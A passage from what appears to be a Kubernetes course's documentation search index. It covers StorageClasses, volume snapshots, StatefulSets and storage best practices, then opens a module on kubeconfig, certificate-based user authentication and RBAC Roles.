\"\"\n  fsType: \"ext4\"\n</code></pre> <p>Rook-Ceph:</p> <pre><code>apiVersion: storage.k8s.io/v1\nkind: StorageClass\nmetadata:\n  name: rook-ceph-block\nprovisioner: rook-ceph.rbd.csi.ceph.com\nparameters:\n  clusterID: rook-ceph\n  pool: replicapool\n  imageFormat: \"2\"\n  imageFeatures: layering\n  csi.storage.k8s.io/provisioner-secret-name: rook-csi-rbd-provisioner\n  csi.storage.k8s.io/provisioner-secret-namespace: rook-ceph\n  csi.storage.k8s.io/node-stage-secret-name: rook-csi-rbd-node\n  csi.storage.k8s.io/node-stage-secret-namespace: rook-ceph\n  csi.storage.k8s.io/fstype: ext4\nallowVolumeExpansion: true\nreclaimPolicy: Delete\n</code></pre>"},{"location":"04-storage/#53-volume-snapshots","title":"5.3 Volume Snapshots","text":"<p>VolumeSnapshotClass:</p> <pre><code>apiVersion: snapshot.storage.k8s.io/v1\nkind: VolumeSnapshotClass\nmetadata:\n  name: csi-snapclass\ndriver: ebs.csi.aws.com\ndeletionPolicy: Delete\n</code></pre> <p>VolumeSnapshot:</p> <pre><code>apiVersion: snapshot.storage.k8s.io/v1\nkind: VolumeSnapshot\nmetadata:\n  name: mysql-snapshot\nspec:\n  volumeSnapshotClassName: csi-snapclass\n  source:\n    persistentVolumeClaimName: mysql-pvc\n</code></pre> <p>Restore from Snapshot:</p> <pre><code>apiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: mysql-pvc-restored\nspec:\n  storageClassName: fast-ssd\n  dataSource:\n    name: mysql-snapshot\n    kind: VolumeSnapshot\n    apiGroup: snapshot.storage.k8s.io\n  accessModes:\n  - ReadWriteOnce\n  resources:\n    requests:\n      storage: 10Gi\n</code></pre>"},{"location":"04-storage/#54-volume-cloning","title":"5.4 Volume Cloning","text":"<pre><code>apiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: cloned-pvc\nspec:\n  storageClassName: fast-ssd\n  dataSource:\n    name: source-pvc\n    kind: PersistentVolumeClaim\n  accessModes:\n  - ReadWriteOnce\n  resources:\n    requests:\n      storage: 10Gi\n</code></pre>"},{"location":"04-storage/#6-statefulsets","title":"6. StatefulSets","text":""},{"location":"04-storage/#61-what-are-statefulsets","title":"6.1 What are StatefulSets?","text":"<p>StatefulSets manage stateful applications, providing:</p> <ul> <li>Stable, unique network identifiers</li> <li>Stable, persistent storage</li> <li>Ordered, graceful deployment and scaling</li> <li>Ordered, automated rolling updates</li> </ul>"},{"location":"04-storage/#62-statefulset-example","title":"6.2 StatefulSet Example","text":"<pre><code>apiVersion: v1\nkind: Service\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  ports:\n  - port: 3306\n    name: mysql\n  clusterIP: None  # Headless service\n  selector:\n    app: mysql\n---\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mysql\nspec:\n  serviceName: mysql\n  replicas: 3\n  selector:\n    matchLabels:\n      app: mysql\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      containers:\n      - name: mysql\n        image: mysql:8.0\n        ports:\n        - containerPort: 3306\n          name: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: password\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/mysql\n        - name: config\n          mountPath: /etc/mysql/conf.d\n      volumes:\n      - name: config\n        configMap:\n          name: mysql-config\n  volumeClaimTemplates:\n  - metadata:\n      name: data\n    spec:\n      accessModes:\n      - ReadWriteOnce\n      storageClassName: fast-ssd\n      resources:\n        requests:\n          storage: 10Gi\n</code></pre>"},{"location":"04-storage/#63-statefulset-features","title":"6.3 StatefulSet Features","text":"<p>Stable Network Identity: - Predictable Pod names: <code>mysql-0</code>, <code>mysql-1</code>, <code>mysql-2</code> - Stable DNS: <code>mysql-0.mysql.default.svc.cluster.local</code></p> <p>Ordered Operations: - Pods created in order: 0, 1, 2 - Pods deleted in reverse: 2, 1, 0 - Rolling updates sequential</p> <p>Persistent Storage: - volumeClaimTemplates create PVC per Pod - PVCs not deleted when StatefulSet scaled down - Data preserved across Pod restarts</p>"},{"location":"04-storage/#64-advanced-statefulset","title":"6.4 Advanced StatefulSet","text":"<pre><code>apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: cassandra\nspec:\n  serviceName: cassandra\n  replicas: 3\n  podManagementPolicy: Parallel  # Create Pods in parallel\n  updateStrategy:\n    type: RollingUpdate\n    rollingUpdate:\n      partition: 0  # Update all Pods\n  selector:\n    matchLabels:\n      app: cassandra\n  template:\n    metadata:\n      labels:\n        app: cassandra\n    spec:\n      terminationGracePeriodSeconds: 1800\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - cassandra\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: cassandra\n        image: cassandra:4.0\n        ports:\n        - containerPort: 7000\n          name: intra-node\n        - containerPort: 7001\n          name: tls-intra-node\n        - containerPort: 7199\n          name: jmx\n        - containerPort: 9042\n          name: cql\n        resources:\n          requests:\n            cpu: 2\n            memory: 4Gi\n          limits:\n            cpu: 2\n            memory: 4Gi\n        env:\n        - name: CASSANDRA_SEEDS\n          value: cassandra-0.cassandra.default.svc.cluster.local\n        - name: MAX_HEAP_SIZE\n          value: 2G\n        - name: HEAP_NEWSIZE\n          value: 512M\n        - name: CASSANDRA_CLUSTER_NAME\n          value: \"K8s-Cassandra\"\n        - name: CASSANDRA_DC\n          value: \"DC1\"\n        - name: CASSANDRA_RACK\n          value: \"Rack1\"\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/cassandra\n        livenessProbe:\n          exec:\n            command:\n            - /bin/sh\n            - -c\n            - nodetool status\n          initialDelaySeconds: 90\n          periodSeconds: 30\n        readinessProbe:\n          exec:\n            command:\n            - /bin/sh\n            - -c\n            - nodetool status | grep UN\n          initialDelaySeconds: 60\n          periodSeconds: 10\n  volumeClaimTemplates:\n  - metadata:\n      name: data\n    spec:\n      accessModes:\n      - ReadWriteOnce\n      storageClassName: fast-ssd\n      resources:\n        requests:\n          storage: 100Gi\n</code></pre>"},{"location":"04-storage/#7-storage-architecture-diagram","title":"7. Storage Architecture Diagram","text":"<pre><code>graph TB\n    subgraph \"User/Developer Layer\"\n        DEV[Developer]\n        YAML[Pod/StatefulSet YAML]\n    end\n\n    subgraph \"Abstraction Layer\"\n        PVC1[PersistentVolumeClaim&lt;br/&gt;mysql-pvc&lt;br/&gt;Request: 10Gi RWO]\n        PVC2[PersistentVolumeClaim&lt;br/&gt;app-pvc&lt;br/&gt;Request: 5Gi RWO]\n        SC[StorageClass&lt;br/&gt;fast-ssd&lt;br/&gt;Provisioner: ebs.csi.aws.com]\n    end\n\n    subgraph \"Storage Layer\"\n        PV1[PersistentVolume&lt;br/&gt;pv-123&lt;br/&gt;Capacity: 10Gi&lt;br/&gt;RWO]\n        PV2[PersistentVolume&lt;br/&gt;pv-456&lt;br/&gt;Capacity: 5Gi&lt;br/&gt;RWO]\n    end\n\n    subgraph \"CSI Driver Layer\"\n        CSI[CSI Driver&lt;br/&gt;ebs.csi.aws.com]\n        CSINODE[CSI Node Plugin&lt;br/&gt;DaemonSet]\n        CSICTRL[CSI Controller&lt;br/&gt;Deployment]\n    end\n\n    subgraph \"Physical Storage\"\n        EBS1[AWS EBS Volume&lt;br/&gt;vol-abc123&lt;br/&gt;gp3, 10GB]\n        EBS2[AWS EBS Volume&lt;br/&gt;vol-def456&lt;br/&gt;gp3, 5GB]\n    end\n\n    subgraph \"Kubernetes Cluster\"\n        subgraph \"Pod/StatefulSet\"\n            POD1[Pod: mysql-0&lt;br/&gt;Container: mysql]\n            POD2[Pod: app-abc]\n\n            VOL1[Volume Mount&lt;br/&gt;/var/lib/mysql]\n            VOL2[Volume Mount&lt;br/&gt;/data]\n\n            POD1 --&gt; VOL1\n            POD2 --&gt; VOL2\n        end\n    end\n\n    DEV --&gt;|Creates| YAML\n    YAML --&gt;|References| PVC1\n    YAML --&gt;|References| PVC2\n\n    PVC1 --&gt;|Requests from| SC\n    PVC2 --&gt;|Requests from| SC\n\n    SC -.-&gt;|Dynamic Provisioning| CSICTRL\n\n    PVC1 &lt;--&gt;|Binds to| PV1\n    PVC2 &lt;--&gt;|Binds to| PV2\n\n    VOL1 -.-&gt;|Uses| PVC1\n    VOL2 -.-&gt;|Uses| PVC2\n\n    PV1 &lt;--&gt;|Backed by| EBS1\n    PV2 &lt;--&gt;|Backed by| EBS2\n\n    CSICTRL --&gt;|Creates/Deletes| EBS1\n    CSICTRL --&gt;|Creates/Deletes| EBS2\n\n    CSINODE --&gt;|Attaches/Mounts| EBS1\n    CSINODE --&gt;|Attaches/Mounts| EBS2\n\n    CSI --&gt; CSINODE\n    CSI --&gt; CSICTRL\n\n    style SC fill:#326CE5,stroke:#fff,color:#fff\n    style PVC1 fill:#4ECDC4,stroke:#fff,color:#fff\n    style PVC2 fill:#4ECDC4,stroke:#fff,color:#fff\n    style PV1 fill:#FF6B6B,stroke:#fff,color:#fff\n    style PV2 fill:#FF6B6B,stroke:#fff,color:#fff\n    style CSI fill:#95E1D3,stroke:#fff,color:#000\n    style EBS1 fill:#F38181,stroke:#fff,color:#fff\n    style EBS2 fill:#F38181,stroke:#fff,color:#fff</code></pre>"},{"location":"04-storage/#8-best-practices","title":"8. Best Practices","text":""},{"location":"04-storage/#81-general-storage-best-practices","title":"8.1 General Storage Best Practices","text":"<ol> <li>Use dynamic provisioning</li> <li>Avoid pre-provisioning PVs</li> <li>Let StorageClass handle creation</li> <li> <p>Easier management and scaling</p> </li> <li> <p>Use WaitForFirstConsumer binding mode</p> </li> <li>Ensures volume in correct zone</li> <li>Critical for multi-zone clusters</li> <li> <p>Prevents scheduling issues</p> </li> <li> <p>Define resource requests accurately</p> </li> <li>Don't over-provision storage</li> <li>Monitor actual usage</li> <li> <p>Plan for growth</p> </li> <li> <p>Enable volume expansion</p> </li> <li>Set <code>allowVolumeExpansion: true</code></li> <li>Allows growing volumes without downtime</li> <li>Not all storage types support it</li> </ol>"},{"location":"04-storage/#82-storageclass-best-practices","title":"8.2 StorageClass Best Practices","text":"<ol> <li>Create multiple StorageClasses</li> <li>Different performance tiers (SSD, HDD)</li> <li>Different backup policies</li> <li> <p>Different replication factors</p> </li> <li> <p>Use meaningful names</p> </li> <li><code>fast-ssd</code>, <code>slow-hdd</code>, <code>replicated-storage</code></li> <li>Include performance characteristics</li> <li> <p>Document in naming</p> </li> <li> <p>Set appropriate reclaim policies</p> </li> <li><code>Delete</code> for ephemeral data</li> <li><code>Retain</code> for production databases</li> <li>Consider data protection requirements</li> </ol>"},{"location":"04-storage/#83-statefulset-best-practices","title":"8.3 StatefulSet Best Practices","text":"<ol> <li>Use headless services</li> <li>Required for stable network identities</li> <li>Enables direct Pod-to-Pod communication</li> <li> <p>Critical for clustered applications</p> </li> <li> <p>Configure Pod anti-affinity</p> </li> <li>Spread Pods across nodes</li> <li>Improves availability</li> <li> <p>Prevents single point of failure</p> </li> <li> <p>Set appropriate termination grace period</p> </li> <li>Allow time for graceful shutdown</li> <li>Prevent data corruption</li> <li> <p>Database-specific tuning</p> </li> <li> <p>Use init containers for setup</p> </li> <li>Database initialization</li> <li>Configuration generation</li> <li>Dependency checking</li> </ol>"},{"location":"04-storage/#84-backup-best-practices","title":"8.4 Backup Best Practices","text":"<ol> <li>Regular snapshots</li> <li>Automated snapshot schedules</li> <li>Use VolumeSnapshot API</li> <li> <p>Test restoration regularly</p> </li> <li> <p>Off-cluster backups</p> </li> <li>Don't rely solely on snapshots</li> <li>Export to object storage (S3, GCS)</li> <li> <p>Geographic redundancy</p> </li> <li> <p>Implement backup retention</p> </li> <li>Define retention policies</li> <li>Automate old backup cleanup</li> <li>Balance cost vs. compliance</li> </ol>"},{"location":"04-storage/#9-anti-patterns-and-common-mistakes","title":"9. Anti-Patterns and Common Mistakes","text":""},{"location":"04-storage/#91-storage-anti-patterns","title":"9.1 Storage Anti-Patterns","text":"<p>\u274c Using hostPath in production <pre><code># DON'T DO THIS IN PRODUCTION\nvolumes:\n- name: data\n  hostPath:\n    path: /mnt/data\n    type: Directory\n</code></pre></p> <p>\u274c No backup strategy - Data loss risk - No disaster recovery - Compliance violations</p> <p>\u274c Ignoring access modes <pre><code># Wrong access mode for use case\naccessModes:\n- ReadWriteMany  # But using single-node storage!\n</code></pre></p>"},{"location":"04-storage/#92-pvc-anti-patterns","title":"9.2 PVC Anti-Patterns","text":"<p>\u274c Oversized PVCs <pre><code># Requesting way more than needed\nresources:\n  requests:\n    storage: 1Ti  # Only need 10Gi!\n</code></pre></p> <p>\u274c No StorageClass specified <pre><code># Uses default, might not be appropriate\nspec:\n  # storageClassName: missing!\n  accessModes:\n  - ReadWriteOnce\n</code></pre></p> <p>\u274c Deleting PVC with Retain policy - Orphaned PVs - Wasted storage costs - Manual cleanup needed</p>"},{"location":"04-storage/#93-statefulset-anti-patterns","title":"9.3 StatefulSet Anti-Patterns","text":"<p>\u274c Using Deployment for stateful apps <pre><code># DON'T: Deployments don't guarantee stable identities\nkind: Deployment  # Should be StatefulSet!\n</code></pre></p> <p>\u274c No pod management policy consideration - Sequential startup may be slow - Parallel can cause race conditions - Choose based on app requirements</p> <p>\u274c Insufficient termination grace period <pre><code># Too short for database\nterminationGracePeriodSeconds: 30  # Database needs more!\n</code></pre></p>"},{"location":"04-storage/#10-hands-on-lab-references","title":"10. Hands-on Lab References","text":"<p>This module includes the following hands-on labs in the <code>/labs/04-storage/</code> directory:</p> <ol> <li>Lab 4.1: Working with Volumes</li> <li>Create emptyDir and ConfigMap volumes</li> <li>Mount secrets as volumes</li> <li>Share volumes between containers</li> <li> <p>File: <code>/labs/04-storage/lab-4.1-volumes.md</code></p> </li> <li> <p>Lab 4.2: PersistentVolumes and Claims</p> </li> <li>Create static PVs</li> <li>Request storage with PVCs</li> <li>Bind PVCs to PVs</li> <li> <p>File: <code>/labs/04-storage/lab-4.2-pv-pvc.md</code></p> </li> <li> <p>Lab 4.3: Dynamic Provisioning</p> </li> <li>Create StorageClasses</li> <li>Use dynamic provisioning</li> <li>Expand volumes</li> <li> <p>File: <code>/labs/04-storage/lab-4.3-dynamic-provisioning.md</code></p> </li> <li> <p>Lab 4.4: StatefulSets</p> </li> <li>Deploy MySQL StatefulSet</li> <li>Scale StatefulSet</li> <li>Update StatefulSet</li> <li>Test persistent storage</li> <li> <p>File: <code>/labs/04-storage/lab-4.4-statefulsets.md</code></p> </li> <li> <p>Lab 4.5: Volume Snapshots and Backups</p> </li> <li>Create volume snapshots</li> <li>Restore from snapshots</li> <li>Clone volumes</li> <li>File: <code>/labs/04-storage/lab-4.5-snapshots.md</code></li> </ol>"},{"location":"04-storage/#11-security-checklist","title":"11. Security Checklist","text":""},{"location":"04-storage/#volume-security","title":"Volume Security","text":"<ul> <li>[ ] Avoid hostPath volumes in production</li> <li>[ ] Use readOnly mounts when possible</li> <li>[ ] Set appropriate file permissions (defaultMode)</li> <li>[ ] Use secrets for sensitive data, not ConfigMaps</li> <li>[ ] Encrypt data at rest</li> <li>[ ] Limit volume size (sizeLimit for emptyDir)</li> <li>[ ] Use Pod Security Standards to restrict volume types</li> </ul>"},{"location":"04-storage/#pvpvc-security","title":"PV/PVC Security","text":"<ul> <li>[ ] Enable encryption for PVs (CSI parameters)</li> <li>[ ] Use RBAC to control PVC creation</li> <li>[ ] Implement resource quotas for storage</li> <li>[ ] Set appropriate reclaim policies</li> <li>[ ] Audit PVC/PV access</li> <li>[ ] Use separate StorageClasses per tenant</li> </ul>"},{"location":"04-storage/#storageclass-security","title":"StorageClass Security","text":"<ul> <li>[ ] Enable encryption in StorageClass parameters</li> <li>[ ] Use CSI drivers with security features</li> <li>[ ] Restrict StorageClass access with RBAC</li> <li>[ ] Define allowed StorageClasses per namespace</li> <li>[ ] Use volume binding mode WaitForFirstConsumer</li> <li>[ ] Implement backup/snapshot policies</li> </ul>"},{"location":"04-storage/#statefulset-security","title":"StatefulSet Security","text":"<ul> <li>[ ] Use Pod Security Standards</li> <li>[ ] Configure resource limits</li> <li>[ ] Enable network policies</li> <li>[ ] Use secrets for credentials</li> <li>[ ] Implement RBAC for StatefulSet management</li> <li>[ ] Configure security contexts</li> <li>[ ] Use read-only root filesystems where possible</li> </ul>"},{"location":"04-storage/#backup-and-dr","title":"Backup and DR","text":"<ul> <li>[ ] Automated regular backups</li> <li>[ ] Off-cluster backup storage</li> <li>[ ] Encrypted backups</li> <li>[ ] Tested restore procedures</li> <li>[ ] Documented recovery time objectives (RTO)</li> <li>[ ] Documented recovery point objectives (RPO)</li> <li>[ ] Backup retention policies</li> <li>[ ] Backup access controls</li> </ul>"},{"location":"04-storage/#12-references","title":"12. References","text":"<ol> <li>Kubernetes Official Documentation</li> <li>Volumes: https://kubernetes.io/docs/concepts/storage/volumes/</li> <li>Persistent Volumes: https://kubernetes.io/docs/concepts/storage/persistent-volumes/</li> <li>Storage Classes: https://kubernetes.io/docs/concepts/storage/storage-classes/</li> <li>StatefulSets: https://kubernetes.io/docs/concepts/workloads/controllers/statefulset/</li> <li> <p>CSI: https://kubernetes.io/docs/concepts/storage/volumes/#csi</p> </li> <li> <p>CSI Documentation</p> </li> <li>CSI Specification: https://github.com/container-storage-interface/spec</li> <li>Kubernetes CSI Developer Documentation: https://kubernetes-csi.github.io/docs/</li> <li>AWS EBS CSI Driver: https://github.com/kubernetes-sigs/aws-ebs-csi-driver</li> <li> <p>GCP PD CSI Driver: https://github.com/kubernetes-sigs/gcp-compute-persistent-disk-csi-driver</p> </li> <li> <p>Storage Solutions</p> </li> <li>Longhorn Documentation: https://longhorn.io/docs/</li> <li>Rook Documentation: https://rook.io/docs/</li> <li>Ceph Documentation: https://docs.ceph.com/</li> <li> <p>OpenEBS: https://openebs.io/docs</p> </li> <li> <p>Backup Solutions</p> </li> <li>Velero: https://velero.io/docs/</li> <li>Kasten K10: https://docs.kasten.io/</li> <li> <p>Stash: https://stash.run/docs/</p> </li> <li> <p>Security</p> </li> <li>CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes</li> <li> <p>NIST Storage Security: https://csrc.nist.gov/publications/detail/sp/800-209/final</p> </li> <li> <p>Books and Guides</p> </li> <li>\"Cloud Native Data Center Networking\" by Dinesh Dutt (O'Reilly)</li> <li>\"Managing Kubernetes\" by Brendan Burns and Craig Tracey (O'Reilly)</li> </ol>"},{"location":"04-storage/#summary","title":"Summary","text":"<p>In this module, you learned about Kubernetes storage:</p> <p>Volume Types: - Ephemeral volumes (emptyDir, configMap, secret) - Persistent volumes for stateful applications - Different volume types for different use cases</p> <p>PersistentVolumes and Claims: - PVs provide cluster-wide storage resources - PVCs request storage for Pods - Binding process connects PVCs to PVs</p> <p>Dynamic Provisioning: - StorageClasses enable automated provisioning - CSI drivers provide vendor-specific implementations - Volume snapshots for backup and cloning</p> <p>StatefulSets: - Manage stateful applications - Provide stable network identities - Persistent storage per Pod replica - Ordered deployment and scaling</p> <p>Best Practices: - Use dynamic provisioning - Implement regular backups - Apply appropriate security controls - Monitor storage usage and performance</p> <p>Next Module: 05-authn-authz.md - Authentication and Authorization</p>"},{"location":"05-authn-authz/","title":"Module 05: Authentication and Authorization","text":""},{"location":"05-authn-authz/#overview","title":"Overview","text":"<p>Estimated Time: 5-6 hours</p> <p>Module Type: Security Deep Dive</p> <p>Prerequisites: - Module 01 - Kubernetes Basics - Module 02 - Control Plane and Cluster Components - Understanding of authentication concepts (certificates, tokens, OAuth/OIDC)</p> <p>Security is paramount in Kubernetes. This module covers authentication (authn) and authorization (authz) mechanisms that control who can access the cluster and what they can do. You'll learn about kubeconfig files, service accounts, Role-Based Access Control (RBAC), and integration with external identity providers using OIDC. Understanding these concepts is essential for securing production Kubernetes clusters.</p>"},{"location":"05-authn-authz/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Understand Kubernetes authentication mechanisms and strategies</li> <li>Configure and use kubeconfig files and contexts</li> <li>Implement Role-Based Access Control (RBAC) with Roles and RoleBindings</li> <li>Create and manage Service Accounts for Pod authentication</li> <li>Integrate external identity providers using OIDC</li> <li>Apply principle of least privilege in RBAC policies</li> <li>Troubleshoot authentication and authorization issues</li> <li>Implement security best practices for cluster access control</li> </ol>"},{"location":"05-authn-authz/#1-authentication-overview","title":"1. Authentication Overview","text":""},{"location":"05-authn-authz/#11-what-is-authentication","title":"1.1 What is Authentication?","text":"<p>Authentication is the process of verifying the identity of a user or service account accessing the Kubernetes API. Once authenticated, the request proceeds to authorization.</p> <p>Authentication Flow: 1. Client sends request to API server with credentials 2. API server authenticates using configured authentication strategies 3. If successful, user identity is established 4. Request proceeds to authorization 5. If authorization succeeds, request is admitted and executed</p>"},{"location":"05-authn-authz/#12-user-types","title":"1.2 User Types","text":"<p>Normal Users: - Humans accessing the cluster - Managed outside Kubernetes - Typically authenticated via certificates or external identity providers - No User API object in Kubernetes</p> <p>Service Accounts: - Processes running in Pods - Managed by Kubernetes API - Automatically mounted into Pods - Represented as ServiceAccount objects</p>"},{"location":"05-authn-authz/#13-authentication-strategies","title":"1.3 Authentication Strategies","text":"<p>Kubernetes supports multiple authentication strategies:</p> <ol> <li>X.509 Client Certificates</li> <li>Most common for cluster administrators</li> <li>Certificates signed by cluster CA</li> <li>User identified by certificate Common Name (CN)</li> <li> <p>Group membership from Organization (O) fields</p> </li> <li> <p>Static Token Files</p> </li> <li>Pre-shared tokens in a file</li> <li>Not recommended for production</li> <li> <p>No expiration or rotation</p> </li> <li> <p>Bootstrap Tokens</p> </li> <li>Used for node bootstrapping</li> <li>Time-limited</li> <li> <p>Stored as Secrets</p> </li> <li> <p>Service Account Tokens</p> </li> <li>JWT tokens for service accounts</li> <li>Automatically mounted in Pods</li> <li> <p>Can be created manually</p> </li> <li> <p>OpenID Connect (OIDC)</p> </li> <li>Integration with external identity providers</li> <li>Recommended for user authentication</li> <li> <p>Supports SSO and MFA</p> </li> <li> <p>Webhook Token Authentication</p> </li> <li>External authentication service</li> <li>Custom authentication logic</li> <li> <p>Bearer token verification</p> </li> <li> <p>Authenticating Proxy</p> </li> <li>Proxy handles authentication</li> <li>Passes user identity via headers</li> <li>Used with corporate SSO systems</li> </ol>"},{"location":"05-authn-authz/#2-kubeconfig-and-contexts","title":"2. kubeconfig and Contexts","text":""},{"location":"05-authn-authz/#21-kubeconfig-structure","title":"2.1 kubeconfig Structure","text":"<p>kubeconfig files contain cluster connection information and credentials.</p> <p>Structure: <pre><code>apiVersion: v1\nkind: Config\ncurrent-context: dev-cluster\nclusters:\n- name: dev-cluster\n  cluster:\n    certificate-authority-data: &lt;base64-ca-cert&gt;\n    server: https://dev.example.com:6443\n- name: prod-cluster\n  cluster:\n    certificate-authority-data: &lt;base64-ca-cert&gt;\n    server: https://prod.example.com:6443\ncontexts:\n- name: dev-context\n  context:\n    cluster: dev-cluster\n    user: dev-admin\n    namespace: development\n- name: prod-context\n  context:\n    cluster: prod-cluster\n    user: prod-admin\n    namespace: production\nusers:\n- name: dev-admin\n  user:\n    client-certificate-data: &lt;base64-client-cert&gt;\n    client-key-data: &lt;base64-client-key&gt;\n- name: prod-admin\n  user:\n    client-certificate-data: &lt;base64-client-cert&gt;\n    client-key-data: &lt;base64-client-key&gt;\n</code></pre></p>"},{"location":"05-authn-authz/#22-creating-kubeconfig","title":"2.2 Creating kubeconfig","text":"<p>Manual Creation:</p> <pre><code># Set cluster\nkubectl config set-cluster dev-cluster \\\n  --server=https://dev.example.com:6443 \\\n  --certificate-authority=/path/to/ca.crt \\\n  --embed-certs=true\n\n# Set credentials\nkubectl config set-credentials dev-admin \\\n  --client-certificate=/path/to/client.crt \\\n  --client-key=/path/to/client.key \\\n  --embed-certs=true\n\n# Set context\nkubectl config set-context dev-context \\\n  --cluster=dev-cluster \\\n  --user=dev-admin \\\n  --namespace=development\n\n# Use context\nkubectl config use-context dev-context\n</code></pre>"},{"location":"05-authn-authz/#23-context-management","title":"2.3 Context Management","text":"<pre><code># View current context\nkubectl config current-context\n\n# List all contexts\nkubectl config get-contexts\n\n# Switch context\nkubectl config use-context prod-context\n\n# View kubeconfig\nkubectl config view\n\n# View kubeconfig with secrets\nkubectl config view --raw\n\n# Set default namespace for context\nkubectl config set-context --current --namespace=production\n</code></pre>"},{"location":"05-authn-authz/#24-multiple-kubeconfig-files","title":"2.4 Multiple kubeconfig Files","text":"<pre><code># Use multiple kubeconfig files\nexport KUBECONFIG=~/.kube/config:~/.kube/dev-config:~/.kube/prod-config\n\n# Merge kubeconfig files\nKUBECONFIG=~/.kube/config:~/.kube/dev-config kubectl config view --flatten &gt; ~/.kube/merged-config\n</code></pre>"},{"location":"05-authn-authz/#25-user-authentication-with-certificates","title":"2.5 User Authentication with Certificates","text":"<p>Generate User Certificate:</p> <pre><code># Generate private key\nopenssl genrsa -out developer.key 2048\n\n# Create certificate signing request\nopenssl req -new -key developer.key -out developer.csr -subj \"/CN=developer/O=engineering\"\n\n# Create CertificateSigningRequest\ncat &lt;&lt;EOF | kubectl apply -f -\napiVersion: certificates.k8s.io/v1\nkind: CertificateSigningRequest\nmetadata:\n  name: developer-csr\nspec:\n  request: $(cat developer.csr | base64 | tr -d '\\n')\n  signerName: kubernetes.io/kube-apiserver-client\n  expirationSeconds: 31536000  # 1 year\n  usages:\n  - client auth\nEOF\n\n# Approve CSR\nkubectl certificate approve developer-csr\n\n# Get certificate\nkubectl get csr developer-csr -o jsonpath='{.status.certificate}' | base64 -d &gt; developer.crt\n\n# Create kubeconfig for user\nkubectl config set-credentials developer \\\n  --client-certificate=developer.crt \\\n  --client-key=developer.key \\\n  --embed-certs=true\n</code></pre>"},{"location":"05-authn-authz/#3-role-based-access-control-rbac","title":"3. Role-Based Access Control (RBAC)","text":""},{"location":"05-authn-authz/#31-rbac-overview","title":"3.1 RBAC Overview","text":"<p>RBAC regulates access to Kubernetes resources based on roles assigned to users or service accounts.</p> <p>RBAC Components: - Role: Permissions within a namespace - ClusterRole: Permissions cluster-wide - RoleBinding: Binds Role to users/groups/service accounts in a namespace - ClusterRoleBinding: Binds ClusterRole cluster-wide</p>"},{"location":"05-authn-authz/#32-roles","title":"3.2 Roles","text":"<p>Namespace-Scoped Role:</p> <pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: pod-reader\n  namespace: development\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n- apiGroups: [\"\"]\n  resources: [\"pods/log\"]\n  verbs: [\"get\"]\n</code></pre> <p>Common API Groups: - <code>\"\"</code> (core) - Pods, Services, ConfigMaps, Secrets, etc. - <code>apps</code> - Deployments, StatefulSets, DaemonSets, ReplicaSets - <code>batch</code> - Jobs, CronJobs - <code>rbac.authorization.k8s.io</code> - Roles, RoleBindings - <code>networking.k8s.io</code> - Ingresses, NetworkPolicies</p> <p>Common Verbs: - <code>get</code>, <code>list</code>, <code>watch</code> - Read operations - <code>create</code> - Create resources - <code>update</code>, <code>patch</code> - Modify resources - <code>delete</code>, <code>deletecollection</code> - Delete resources - <code>*</code> - All verbs (use sparingly!)</p> <p>Advanced Role Example:</p> <pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: Role\nmetadata:\n  name: developer-role\n  namespace: production\nrules:\n# Allow full access to deployments\n- apiGroups: [\"apps\"]\n  resources: [\"deployments\"]\n  verbs: [\"get\", \"list\", \"watch\", \"create\", \"update\", \"patch\", \"delete\"]\n# Allow read access to pods\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n# Allow pod logs access\n- apiGroups: [\"\"]\n  resources: [\"pods/log\"]\n  verbs: [\"get\", \"list\"]\n# Allow exec into pods (debugging)\n- apiGroups: [\"\"]\n  resources: [\"pods/exec\"]\n  verbs: [\"create\"]\n# Allow access to services\n- apiGroups: [\"\"]\n  resources: [\"services\"]\n  verbs: [\"get\", \"list\", \"watch\", \"create\", \"update\", \"patch\"]\n# Allow ConfigMap read\n- apiGroups: [\"\"]\n  resources: [\"configmaps\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n# Deny Secret access (no rule = deny)\n</code></pre>"},{"location":"05-authn-authz/#33-clusterroles","title":"3.3 ClusterRoles","text":"<p>Cluster-Wide Role:</p> <pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: cluster-reader\nrules:\n- apiGroups: [\"\"]\n  resources: [\"nodes\", \"persistentvolumes\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n- apiGroups: [\"storage.k8s.io\"]\n  resources: [\"storageclasses\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n</code></pre> <p>ClusterRole for Namespace Resources:</p> <pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRole\nmetadata:\n  name: pod-reader-all-namespaces\nrules:\n- apiGroups: [\"\"]\n  resources: [\"pods\"]\n  verbs: [\"get\", \"list\", \"watch\"]\n</code></pre>"},{"location":"05-authn-authz/#34-rolebindings","title":"3.4 RoleBindings","text":"<p>Bind Role to User:</p> <pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: RoleBinding\nmetadata:\n  name: developer-binding\n  namespace: production\nsubjects:\n- kind: User\n  name: developer\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: developer-role\n  apiGroup: rbac.authorization.k8s.io\n</code></pre> <p>Bind Role to Group:</p> <pre><code>apiVersion: rbac.authorization.k8s.io/v1\nkind: 